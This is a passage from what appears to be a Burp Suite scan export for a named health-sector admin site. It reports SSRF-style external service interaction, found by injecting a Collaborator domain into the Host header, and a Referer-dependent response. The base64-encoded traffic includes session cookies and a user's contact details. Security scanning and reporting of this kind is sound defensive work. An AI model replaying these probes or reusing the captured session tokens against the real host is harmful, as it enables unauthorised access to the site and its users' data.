      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MDoyMSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMzkxOQ0KU2V0LUNvb2tpZTogQVdTQUxCPXkxdFlrbnh1Nm9nMmh2SDVzR3dTSjJBYTY1cS9PRTZSZkVYL0NHNGs5NE8wY3N6SGUrSDV3NmRIc2VyWXE2Z2wxb3NEcUh2WFppU2M2bTNkREpzcHQvY0V0QXhwRkt0UnMyV1QxL0VvTXluOGxPK29jYm9PRFcranRTV0Y7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1MDoyMSBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz15MXRZa254dTZvZzJodkg1c0d3U0oyQWE2NXEvT0U2UmZFWC9DRzRrOTRPMGNzekhlK0g1dzZkSHNlcllxNmdsMW9zRHFIdlhaaVNjNm0zZERKc3B0L2NFdEF4cEZLdFJzMldUMS9Fb015bjhsTytvY2JvT0RXK2p0U1dGOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTA6MjEgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQogICAgPGRpdj4KICAgICAgICA8c2VjdGlvbiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIGNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iZm9ybU1lc3NhZ2UiIGNsYXNzPSJpbnZhbGlkLWZlZWRiYWNrIGQtYmxvY2siIHN0eWxlPSJmb250LXNpemU6IDAuODVyZW07Ij48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBuYW1lPSJVc2VyUHJvZmlsZUZvcm0iIGlkPSJVc2VyUHJvZmlsZUZvcm0iIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iUE9TVCIgb25zdWJtaXQ9InJldHVybiB2YWxpZGF0ZUZvcm0oJ1VzZXJQcm9maWxlRm9ybScpIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPVNhdmUgbmFtZT1TYXZlIHZhbHVlPVNhdmU+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPkZpcnN0IE5hbWU8c3BhbiBjbGFzcz0idGV4dC1kYW5nZXIiPiAqIDwvc3Bhbj48L2xhYmVsPjxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sICByZXF1aXJlZCIgdHlwZT0idGV4dCIgaWQ9ImZpcnN0TmFtZSIgbmFtZT0iZmlyc3ROYW1lIiB2YWx1ZT0iWVlZIiAgLz4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwICI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbD5MYXN0IE5hbWU8c3BhbiBjbGFzcz0idGV4dC1kYW5nZXIiPiAqIDwvc3Bhbj48L2xhYmVsPjxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sICByZXF1aXJlZCIgdHlwZT0idGV4dCIgaWQ9Imxhc3ROYW1lIiBuYW1lPSJsYXN0TmFtZSIgdmFsdWU9ImN5cGFydGEiICAvPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPkVtYWlsPHNwYW4gY2xhc3M9InRleHQtZGFuZ2VyIj4gKiA8L3NwYW4+PC9sYWJlbD48aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCAgcmVxdWlyZWQiIHR5cGU9InRleHQiIGlkPSJlbWFpbCIgbmFtZT0iZW1haWwiIHZhbHVlPSJiYWhhYUBjeXBhcnRhLmNvbSIgZGlzYWJsZWQgLz4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBzdHlsZT0iZm9udC1zaXplOiAwLjdyZW07IGZvbnQtc3R5bGU6IGl0YWxpYzsiPipDb250YWN0IE9yZ2FuaXphdGlvbiBBZG1pbmlzdHJhdG9yIGZvciBlbWFpbCBhZGRyZXNzIGNoYW5nZXM8L3NwYW4+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWw+UGhvbmU8L2xhYmVsPjxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sICIgdHlwZT0idGV4dCIgaWQ9InBob25lIiBuYW1lPSJwaG9uZSIgdmFsdWU9IjAwMDAwMDAwMDAiICAvPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPkVudHJpZXMgUGVyIFBhZ2U8L2xhYmVsPjxzZWxlY3QgY2xhc3M9ImZvcm0tY29udHJvbCAiIGlkPWVudHJpZXNQZXJQYWdlIG5hbWU9ZW50cmllc1BlclBhZ2UgICAgcGxhY2Vob2xkZXJuYW1lPSJFbnRyaWVzIFBlciBQYWdlIj48b3B0aW9uPjwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEwIiA+MTA8L29wdGlvbj48b3B0aW9uIHZhbHVlPSIyNSIgPjI1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iNTAiID41MDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEwMCIgc2VsZWN0ZWQ+MTAwPC9vcHRpb24+PC9zZWxlY3Q+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGlkPSJzdWJtaXQiIHZhbHVlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWRhcmsiIG5hbWU9InN1Ym1pdCI+U3VibWl0PC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InJlc2V0IiBpZD0icmVzZXQiIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSI+UmVzZXQ8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSIgZGF0YS1kaXNtaXNzPSJtb2RhbCI+Q2FuY2VsPC9hPjxocj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvc2VjdGlvbj4KICAgIDwvZGl2Pgo8c2NyaXB0PgokKGRvY3VtZW50KS5yZWFkeSggZnVuY3Rpb24oKSB7CiAgICAkKCcjc3VibWl0Jykub24oJ2NsaWNrJywgZnVuY3Rpb24oZSkgewogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICB2YXIgZm9ybVN1Ym1pdFJlc3VsdCA9IHZhbGlkYXRlRm9ybSh0eXBlKyJGb3JtIik7CiAgICAgICAgaWYgKGZvcm1TdWJtaXRSZXN1bHQgPT09IHRydWUpIHsKICAgICAgICAgICAgdmFyIGZvcm1EYXRhID0gJCgiI1VzZXJQcm9maWxlRm9ybSIpLnNlcmlhbGl6ZUFycmF5KCk7CiAgICAgICAgICAgIHZhciB1cmwgPSB3aW5kb3cubG9jYXRpb24uaHJlZjsKICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgIHVybCA6IHVybCwKICAgICAgICAgICAgICAgIHR5cGUgOiAncG9zdCcsCiAgICAgICAgICAgICAgICBkYXRhVHlwZTonanNvbicsCiAgICAgICAgICAgICAgICBkYXRhIDogZm9ybURhdGEsCiAgICAgICAgICAgICAgICBzdWNjZXNzIDogZnVuY3Rpb24oIHJlc3BvbnNlICkgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5jb2RlID09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2UucmVtb3ZlSXRlbSgicmVmcmVzaFBhZ2VMZW5ndGgiKTsKICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uID0gdXJsOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICQoIiNmb3JtTWVzc2FnZSIpLmh0bWwocmVzcG9uc2UubWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgfSk7CiAgICAgICAgfQogICAgfSk7Cn0pOwo8L3NjcmlwdD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5241048708930447360</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399/PUT]]></path>
    <location><![CDATA[/UserProfile/399/PUT]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>aiwpob9q47blw55i1pximhmkdbj57x8l1kpac00p.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFpd3BvYjlxNDdibHc1NWkxcHhpbWhta2RiajU3eDhsMWtwYWMwMHAub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.84.197</originIp>
      <time>2024-Dec-15 00:47:57.043 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>aiwpob9q47blw55i1pximhmkdbj57x8l1kpac00p.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>8033283238855513088</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399/PUT]]></path>
    <location><![CDATA[/UserProfile/399/PUT]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>aiwpob9q47blw55i1pximhmkdbj57x8l1kpac00p.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFpd3BvYjlxNDdibHc1NWkxcHhpbWhta2RiajU3eDhsMWtwYWMwMHAub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:47:57.816 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFpd3BvYjlxNDdibHc1NWkxcHhpbWhta2RiajU3eDhsMWtwYWMwMHAub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1na3RnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>5966055330231452672</serialNumber>
    <type>4194560</type>
    <name><![CDATA[Referer-dependent response]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserTotalEvents/]]></path>
    <location><![CDATA[/UserTotalEvents/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>Application responses may depend systematically on the presence or absence of the Referer header in requests. This behavior does not necessarily constitute a security vulnerability, and you should investigate the nature of and reason for the differential responses to determine whether a vulnerability is present.</p>
<p>Common explanations for Referer-dependent responses include: </p>
<ul><li>Referer-based access controls, where the application assumes that if you have arrived from one privileged location then you are authorized to access another privileged location. These controls can be trivially defeated by supplying an accepted Referer header in requests for the vulnerable function.</li><li>Attempts to prevent cross-site request forgery attacks by verifying that requests to perform privileged actions originated from within the application itself and not from some external location. Such defenses are often not robust, and can be bypassed by removing the Referer header entirely.</li>
<li>Delivery of Referer-tailored content, such as welcome messages to visitors from specific domains, search-engine optimization (SEO) techniques, and other ways of tailoring the user's experience. Such behaviors often have no security impact; however, unsafe processing of the Referer header may introduce vulnerabilities such as SQL injection and cross-site scripting. If parts of the document (such as META keywords) are updated based on search engine queries contained in the Referer header, then the application may be vulnerable to persistent code injection attacks, in which search terms are manipulated to cause malicious content to appear in responses served to other application users.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The Referer header is not a robust foundation on which to build access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to Referer spoofing.</p>
<p>If the contents of responses is updated based on Referer data, then the same defenses against malicious input should be employed here as for any other kinds of user-supplied data. </p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li><li><a href="https://cwe.mitre.org/data/definitions/213.html">CWE-213: Intentional Information Exposure</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZSZkcmF3PTEmY29sdW1ucyU1QjAlNUQlNUJkYXRhJTVEPWV2ZW50JmNvbHVtbnMlNUIwJTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjAlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjAlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCMCU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCMCU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUIxJTVEJTVCZGF0YSU1RD1vcmdhbml6YXRpb25faWQmY29sdW1ucyU1QjElNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCMSU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCMSU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUIxJTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUIxJTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2UmY29sdW1ucyU1QjIlNUQlNUJkYXRhJTVEPWRpc3BlbnNlcl9ncm91cF9pZCZjb2x1bW5zJTVCMiU1RCU1Qm5hbWUlNUQ9JmNvbHVtbnMlNUIyJTVEJTVCc2VhcmNoYWJsZSU1RD10cnVlJmNvbHVtbnMlNUIyJTVEJTVCb3JkZXJhYmxlJTVEPXRydWUmY29sdW1ucyU1QjIlNUQlNUJzZWFyY2glNUQlNUJ2YWx1ZSU1RD0mY29sdW1ucyU1QjIlNUQlNUJzZWFyY2glNUQlNUJyZWdleCU1RD1mYWxzZSZjb2x1bW5zJTVCMyU1RCU1QmRhdGElNUQ9ZGlzcGVuc2VyX2lkJmNvbHVtbnMlNUIzJTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjMlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjMlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCMyU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCMyU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUI0JTVEJTVCZGF0YSU1RD11c2VyX2lkJmNvbHVtbnMlNUI0JTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjQlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjQlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNCU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCNCU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUI1JTVEJTVCZGF0YSU1RD10YWdfaWQmY29sdW1ucyU1QjUlNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCNSU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNSU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUI1JTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUI1JTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2UmY29sdW1ucyU1QjYlNUQlNUJkYXRhJTVEPXRhZ19yc3NpJmNvbHVtbnMlNUI2JTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjYlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjYlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNiU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCNiU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUI3JTVEJTVCZGF0YSU1RD1pc19jb21wbGlhbnQmY29sdW1ucyU1QjclNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCNyU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNyU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUI3JTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUI3JTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2UmY29sdW1ucyU1QjglNUQlNUJkYXRhJTVEPWNyZWF0ZWRfYXQmY29sdW1ucyU1QjglNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCOCU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCOCU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUI4JTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUI4JTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2Umb3JkZXIlNUIwJTVEJTVCY29sdW1uJTVEPTgmb3JkZXIlNUIwJTVEJTVCZGlyJTVEPWRlc2Mmc3RhcnQ9MCZsZW5ndGg9NTAmc2VhcmNoJTVCdmFsdWUlNUQ9JnNlYXJjaCU1QnJlZ2V4JTVEPWZhbHNlJl89MTczNDIwMjAwMDM3NiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWQ5M2hpNm92b2Ntbzd1bTBwMTgydnFubmg4OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1BVTNWOERtbnJCSElzR3gvQmlOL2pJYUxQZVp1NnZtTGhGU2F5VWx6Uk9sdWxSR0lKbW9PS2J2ZHUxZ3ZpWlJSdEVNclVnall2RUQ4cUgrSE1EWVZyUmJhVUYzYWZWZEdXNU9DTGxob3pudzIxZDFzNEVQcDJMcUpUNW9lOyBBV1NBTEJDT1JTPUFVM1Y4RG1uckJISXNHeC9CaU4vaklhTFBlWnU2dm1MaEZTYXlVbHpST2x1bFJHSUptb09LYnZkdTFndmlaUlJ0RU1yVWdqWXZFRDhxSCtITURZVnJSYmFVRjNhZlZkR1c1T0NMbGhvem53MjFkMXM0RVBwMkxxSlQ1b2U7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHkNClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KU2VjLUNILVV